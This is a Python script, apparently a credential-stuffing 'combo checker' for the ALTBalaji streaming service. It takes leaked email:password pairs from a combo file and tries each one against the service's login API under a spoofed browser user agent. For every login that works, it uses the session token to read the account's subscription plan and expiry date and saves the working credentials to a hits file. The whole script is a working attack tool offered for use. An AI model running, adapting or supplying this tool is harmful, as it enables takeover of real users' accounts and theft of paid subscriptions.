from fake_useragent import UserAgent
import requests
import json
from datetime import datetime
import webbrowser

url = "https://github.com/falcon71181" 
webbrowser.open(url)
HITS = 0
BADs = 0
FREE = 0
EXPIRED = 0
def update_status():
    global HITS, BADs, FREE, EXPIRED
    print(f"\033[32mHITS: {HITS}, \033[31mBADs: {BADs}, \033[36mFREE: {FREE}, \033[33mEXPIRED: {EXPIRED}\033[0m")

def combinations_generator(path):
    with open(path, 'r') as file:
        for line in file:
            parts = line.strip().split(':')
            if len(parts) == 2:
                email, password = parts
                yield email, password
            else:
                print(f"Wrong Combo Type: {line.strip()}")
def checker(username, password):
    global HITS, BADs, FREE, EXPIRED
    rua = UserAgent()
    UA = rua.chrome.lower()
    url = "https://payment-ms.cloud.altbalaji.com/v1/accounts/login/email?domain=IN"
    headers = {"accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9", "content-length": str(len('{"username":"' + username + '","password":"' + password + '"}')), "content-type": "application/json", "origin": "https://www.altbalaji.com", "referer": "https://www.altbalaji.com/", "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "Windows", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", "user-agent": UA}
    data = {"username": username,"password": password}
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 200:
        result_json = response.json()
        tk = result_json['session_token']
        typeresult="HIT"
        url2 = "https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50"
        headers2 = {"accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9", "origin": "https://www.altbalaji.com", "referer": "https://www.altbalaji.com/", "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "Windows", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", "user-agent": UA, "xssession": tk}
        response = requests.get(url2, headers=headers2)
        result_json = response.json()
        json_data = json.dumps(result_json)
        result_json = json.loads(json_data)
        titles_found = False
        def search_for_titles(data):
            nonlocal titles_found  
            if titles_found:
                return  
            if isinstance(data, dict):
                if "titles" in data:
                    titles_found = True  
                for key, value in data.items():
                    search_for_titles(value)
            elif isinstance(data, list):
                for item in data:
                    search_for_titles(item)
        search_for_titles(result_json)
        if titles_found:
            plan = result_json['orders'][0]['product']['titles']['default']
            expiry = result_json['orders'][0]['dates']['valid_to']
            print("Plan:", plan)
            expiry_datetime = datetime.strptime(expiry, "%Y-%m-%dT%H:%M:%S%z")
            expiry_date = expiry_datetime.strftime("%Y-%m-%d")
            expiry1 = expiry_datetime.strftime("%d-%m-%Y")
            print("Expiry Date:", expiry1)
            current_date = datetime.now().strftime("%Y-%m-%d")
            days_left = (datetime.strptime(expiry_date, "%Y-%m-%d") - datetime.strptime(current_date, "%Y-%m-%d")).days
            print("Days Left:", days_left)
            if days_left >= 1:
                HITS += 1 
                typeresult = "HIT"
                hit = open("hits.txt", "a+")
                hit.write(f"{username}:{password}, Plan: {plan}, Expiry Date: {expiry1}, Days Left: {days_left},\n")
            else:
                EXPIRED += 1
                typeresult = "Expired"
        else:
            FREE += 1
            typeresult = "Free"
    elif response.status_code == 404:
        BADs += 1
        typeresult="BAD"
    else:
        print(response)
        print(result_json)
        typeresult="Something Wrong"
    print("Resul=",typeresult,"\n")
    


logo = "\033[31m" + """
███████╗░█████╗░██╗░░░░░░█████╗░░█████╗░███╗░░██╗███████╗░░███╗░░░░███╗░░░█████╗░░░███╗░░
██╔════╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗████╗░██║╚════██║░████║░░░████║░░██╔══██╗░████║░░
█████╗░░███████║██║░░░░░██║░░╚═╝██║░░██║██╔██╗██║░░░░██╔╝██╔██║░░██╔██║░░╚█████╔╝██╔██║░░
██╔══╝░░██╔══██║██║░░░░░██║░░██╗██║░░██║██║╚████║░░░██╔╝░╚═╝██║░░╚═╝██║░░██╔══██╗╚═╝██║░░
██║░░░░░██║░░██║███████╗╚█████╔╝╚█████╔╝██║░╚███║░░██╔╝░░███████╗███████╗╚█████╔╝███████╗
╚═╝░░░░░╚═╝░░╚═╝╚══════╝░╚════╝░░╚════╝░╚═╝░░╚══╝░░╚═╝░░░╚══════╝╚══════╝░╚════╝░╚══════╝\n\n\n"""
print(logo)

c=""
print("\033[33m""WELCOME TO CHECKER\n")
print("\033[31mFirst Add Your Combo In combo.txt\n")
c=input("\033[36m\nDo you want to continue? (Y/n):- \033[0m")
if c == "Y" or c == "y":
    combo_file = "combo.txt"
    for email, password in combinations_generator(combo_file):
        print(f"Checking: {email}")
        checker(email, password)
        print("------------------------------------")
        update_status()
        print("------------------------------------")
else:
    SystemExit
